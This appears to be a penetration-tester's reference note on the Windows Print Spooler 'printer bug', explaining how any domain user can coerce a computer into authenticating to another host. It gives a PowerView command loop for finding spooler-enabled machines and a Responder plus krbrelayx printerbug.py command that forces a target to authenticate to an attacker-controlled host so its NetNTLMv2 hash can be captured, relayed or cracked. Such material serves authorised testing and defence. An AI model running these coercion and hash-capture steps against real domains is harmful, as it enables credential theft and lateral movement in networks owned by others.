# Printer "Bug"

For any computer that has the **Print Spooler service** enabled (often [[domain-controller|domain controllers]]), any authenticated user can send a print notification to that computer, triggering it to authenticate to the computer that the print notification originated from. This can be exploited to relay the authenticating user's NetNTLM hash for access to machine the user is a local administrator on. It can be exploited to extract a computer's NetNTLM hash for [[offline-password-cracking|offline cracking]]. It can also be combined with the compromise of a computer configured with [[unconstrained-delegation|unconstrained delegation]] to steal a domain user's TGT.

## Determine which Computers have the Print Spooler Service Enabled (domain user credentials required)

From Linux:

- [[rpcdump#Determine if a Computer has the Print Spooler Service Enabled credentials may be required|impacket-rpcdump]]

From Windows:

```powershell
. .\Get-SpoolStatus.ps1
. .\PowerView.ps1
Get-DomainComputer | % {Get-SpoolStatus -ComputerName $_.DnsHostName}
```

## Force Computers with the Print Spooler Service Enabled to Authenticate to an Attacker-Controlled Host and Steal their NetNTLMv2 Hash

From Linux:

1. [[responder#Start Responding|Start responding with Responder]] on the attacker-controlled host.

2. Use `printerbug.py` from [[krbrelayx]] to send the print notification and trigger the target computer to authenticate.

```bash
cd /opt/krbrelayx
python3 printerbug.py [$DOMAIN]/$USERNAME[:$PASSWORD]@$TARGET_FQDN_OR_IP [-hashes $LMHASH:NTLMHASH] $ATTACKER_CONTROLLED_HOST
```

- `$DOMAIN/$USERNAME` is any valid domain user
- `$PASSWORD` or `-hashes` is required
